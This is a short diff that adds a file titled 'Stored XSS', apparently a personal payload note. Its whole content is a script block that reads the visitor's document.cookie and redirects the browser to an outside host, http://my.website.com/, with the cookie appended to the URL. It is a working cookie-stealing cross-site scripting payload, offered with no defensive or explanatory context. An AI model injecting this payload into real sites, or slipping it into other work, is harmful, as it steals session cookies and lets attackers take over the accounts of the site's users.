@@ -1,0 +1,6 @@
+Stored XSS
+<script>
+var cookie = document.cookie;
+window.location="http://my.website.com/"+cookie;
+</script>
+
